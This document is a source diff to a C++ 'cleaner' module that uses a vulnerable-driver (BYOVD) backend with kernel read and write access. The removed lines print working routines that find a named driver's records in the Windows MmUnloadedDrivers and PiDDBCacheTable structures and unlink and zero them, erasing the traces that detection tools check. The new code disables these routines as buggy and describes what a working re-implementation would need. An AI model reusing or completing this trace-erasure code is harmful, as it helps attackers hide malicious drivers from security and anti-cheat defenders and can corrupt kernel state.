@@ -19,20 +19,6 @@ typedef struct _LSA_UNICODE_STRING {
 namespace hinv {
 namespace cleaner {
 
-struct UNLOADED_DRIVER_ENTRY {
-    UNICODE_STRING Name;
-    PVOID StartAddress;
-    PVOID EndAddress;
-    LARGE_INTEGER CurrentTime;
-};
-
-struct PIDDB_CACHE_ENTRY {
-    LIST_ENTRY List;
-    UNICODE_STRING DriverName;
-    ULONG TimeDateStamp;
-    NTSTATUS LoadStatus;
-};
-
 static std::wstring ToLower(std::wstring s) {
     std::transform(s.begin(), s.end(), s.begin(), ::towlower);
     return s;
@@ -149,22 +135,15 @@ static uint64_t FindPiDDBLock(byovd::IByovdBackend* backend) {
 }
 
 // ---------------------------------------------------------------------------
-// Unicode comparison helper
+// MmUnloadedDrivers cleaner — FAIL-CLOSED (disabled)
 // ---------------------------------------------------------------------------
-
-static bool NamesMatch(byovd::IByovdBackend* backend, uint64_t unicodeStringVa, const std::wstring& target) {
-    UNICODE_STRING us{};
-    if (!backend->ReadKernelMemory(unicodeStringVa, &us, sizeof(us))) return false;
-    if (!us.Buffer || us.Length == 0) return false;
-
-    std::wstring name(us.Length / sizeof(wchar_t), L' ');
-    if (!backend->ReadKernelMemory(reinterpret_cast<uint64_t>(us.Buffer), name.data(), us.Length)) return false;
-    return ToLower(name) == ToLower(target);
-}
-
-// ---------------------------------------------------------------------------
-// MmUnloadedDrivers cleaner
-// ---------------------------------------------------------------------------
+//
+// Disabled pending per-build/symbol layout verification. The previous
+// heuristic probe could not distinguish "array of pointers" from "inline array
+// of MM_UNLOADED_DRIVER records": when the global points at an array of
+// records, the first bytes are a UNICODE_STRING (Length/MaximumLength), not a
+// pointer, so the code kept treating the global itself as the record array and
+// could zero MmUnloadedDrivers itself when the first record matched.
 
 bool ClearUnloadedDriverEntry(byovd::IByovdBackend* backend, const std::wstring& driverName) {
     uint64_t globalVa = FindMmUnloadedDrivers(backend);
@@ -172,118 +151,36 @@ bool ClearUnloadedDriverEntry(byovd::IByovdBackend* backend, const std::wstring&
         std::wcerr << L"[hinv::cleaner] MmUnloadedDrivers not located\n";
         return false;
     }
-
-    constexpr size_t ARRAY_SIZE = 50;
-    bool found = false;
-
-    // Determine whether the global is an array of pointers or a pointer to an array.
-    uint64_t firstEntry = 0;
-    uint64_t arrayVa = globalVa;
-    if (backend->ReadKernelMemory(globalVa, &firstEntry, sizeof(firstEntry)) &&
-        firstEntry >= 0xFFFF000000000000ULL) {
-        // Try dereferencing as pointer-to-array.
-        uint64_t probe = 0;
-        if (backend->ReadKernelMemory(firstEntry, &probe, sizeof(probe)) &&
-            probe >= 0xFFFF000000000000ULL) {
-            arrayVa = firstEntry;
-        }
-    }
-
-    // Array of pointers layout (most common).
-    std::vector<uint64_t> pointers(ARRAY_SIZE, 0);
-    if (backend->ReadKernelMemory(arrayVa, pointers.data(), pointers.size() * sizeof(uint64_t))) {
-        for (size_t i = 0; i < ARRAY_SIZE; ++i) {
-            if (!pointers[i]) continue;
-            if (pointers[i] < 0xFFFF000000000000ULL) continue;
-
-            if (NamesMatch(backend, pointers[i], driverName)) {
-                UNLOADED_DRIVER_ENTRY zeroed{};
-                if (backend->WriteKernelMemory(pointers[i], &zeroed, sizeof(zeroed))) {
-                    uint64_t nullPtr = 0;
-                    backend->WriteKernelMemory(arrayVa + i * sizeof(uint64_t), &nullPtr, sizeof(nullPtr));
-                    found = true;
-                    std::wcout << L"[hinv::cleaner] Erased MmUnloadedDrivers entry #" << i << L" for " << driverName << L"\n";
-                }
-            }
-        }
-    }
-
-    // Record-array fallback (less common).
-    if (!found) {
-        UNLOADED_DRIVER_ENTRY entries[ARRAY_SIZE]{};
-        if (backend->ReadKernelMemory(arrayVa, entries, sizeof(entries))) {
-            for (size_t i = 0; i < ARRAY_SIZE; ++i) {
-                if (NamesMatch(backend, arrayVa + i * sizeof(UNLOADED_DRIVER_ENTRY) + offsetof(UNLOADED_DRIVER_ENTRY, Name), driverName)) {
-                    UNLOADED_DRIVER_ENTRY zeroed{};
-                    if (backend->WriteKernelMemory(arrayVa + i * sizeof(UNLOADED_DRIVER_ENTRY), &zeroed, sizeof(zeroed))) {
-                        found = true;
-                        std::wcout << L"[hinv::cleaner] Erased MmUnloadedDrivers record #" << i << L" for " << driverName << L"\n";
-                    }
-                }
-            }
-        }
-    }
-
-    return found;
+    std::wcerr << L"[hinv::cleaner] MmUnloadedDrivers cleaner is DISABLED (fail-closed): "
+               << L"layout is build-dependent and was not verified for this build; "
+               << L"refusing to erase traces for " << driverName
+               << L" (global at 0x" << std::hex << globalVa << std::dec << L")\n";
+    return false;
 }
 
 // ---------------------------------------------------------------------------
-// PiDDBCacheTable cleaner
+// PiDDBCacheTable cleaner — FAIL-CLOSED (disabled)
 // ---------------------------------------------------------------------------
+//
+// Disabled: PiDDBCacheTable is an RTL_AVL_TABLE on current Windows builds, not
+// a LIST_ENTRY head. The previous walker rewrote Flink/Blink and zeroed
+// records without unlinking nodes from the AVL tree, which corrupts kernel
+// metadata and computes write addresses from misinterpreted fields. Also,
+// PiDDBLock is not exported on current builds, so locating it via the export
+// table alone makes the feature silently inert. Re-enable only with a real
+// RtlEnumerateGenericTableAvl-style traversal and a per-build/symbol lock
+// location.
 
 bool ClearPiDddbCache(byovd::IByovdBackend* backend, const std::wstring& driverName) {
     uint64_t tableVa = FindPiDDBCacheTable(backend);
-    if (!tableVa) {
-        std::wcerr << L"[hinv::cleaner] PiDDBCacheTable not located\n";
-        return false;
-    }
-
     uint64_t lockVa = FindPiDDBLock(backend);
-    if (!lockVa) {
-        std::wcerr << L"[hinv::cleaner] PiDDBLock not located; cannot safely modify cache\n";
-        return false;
-    }
-
-    if (!kmem::AcquireKernelLock(backend, lockVa, 0)) {
-        std::wcerr << L"[hinv::cleaner] Failed to acquire PiDDBLock\n";
-        return false;
-    }
-
-    // PiDDBCacheTable uses LIST_ENTRY on Windows 7-10 21H2 and RTL_RB_TREE on newer.
-    // This walker only supports the LIST_ENTRY layout. For RB_TREE builds a
-    // dedicated in-order traversal is required; that is not yet implemented.
-    bool found = false;
-
-    LIST_ENTRY tableList{};
-    if (backend->ReadKernelMemory(tableVa, &tableList, sizeof(tableList))) {
-        uint64_t headFlink = reinterpret_cast<uint64_t>(tableList.Flink);
-        uint64_t current = headFlink;
-        int guard = 0;
-
-        while (current && current != tableVa && guard++ < 1024) {
-            uint64_t entryVa = current - offsetof(PIDDB_CACHE_ENTRY, List);
-            PIDDB_CACHE_ENTRY entry{};
-            if (!backend->ReadKernelMemory(entryVa, &entry, sizeof(entry))) break;
-
-            if (NamesMatch(backend, entryVa + offsetof(PIDDB_CACHE_ENTRY, DriverName), driverName)) {
-                uint64_t flink = reinterpret_cast<uint64_t>(entry.List.Flink);
-                uint64_t blink = reinterpret_cast<uint64_t>(entry.List.Blink);
-
-                backend->WriteKernelMemory(flink + offsetof(LIST_ENTRY, Blink), &blink, sizeof(blink));
-                backend->WriteKernelMemory(blink + offsetof(LIST_ENTRY, Flink), &flink, sizeof(flink));
-
-                PIDDB_CACHE_ENTRY zeroed{};
-                backend->WriteKernelMemory(entryVa, &zeroed, sizeof(zeroed));
-
-                found = true;
-                std::wcout << L"[hinv::cleaner] Removed PiDDBCacheTable entry for " << driverName << L"\n";
-            }
-            current = reinterpret_cast<uint64_t>(entry.List.Flink);
-        }
-    }
-
-    kmem::ReleaseKernelLock(backend, lockVa, 0);
-    return found;
+    std::wcerr << L"[hinv::cleaner] PiDDBCacheTable cleaner is DISABLED (fail-closed): "
+               << L"table is RTL_AVL_TABLE; safe removal is not implemented. "
+               << L"Refusing to erase traces for " << driverName
+               << L" (table=0x" << std::hex << tableVa << L" lock=0x" << lockVa << std::dec << L")\n";
+    if (!tableVa) std::wcerr << L"[hinv::cleaner] PiDDBCacheTable not located\n";
+    if (!lockVa)  std::wcerr << L"[hinv::cleaner] PiDDBLock not located (not exported on this build)\n";
+    return false;
 }
 
 // ---------------------------------------------------------------------------
@@ -302,7 +199,7 @@ CleanResult CleanDriverTraces(byovd::IByovdBackend* backend, const std::wstring&
     result.piDdbCache = ClearPiDddbCache(backend, driverName);
 
     if (!result.mmUnloadedDrivers && !result.piDdbCache) {
-        result.error = L"no matching traces found or globals not located";
+        result.error = L"trace cleaners are disabled (fail-closed) or globals not located; see log";
     }
     return result;
 }
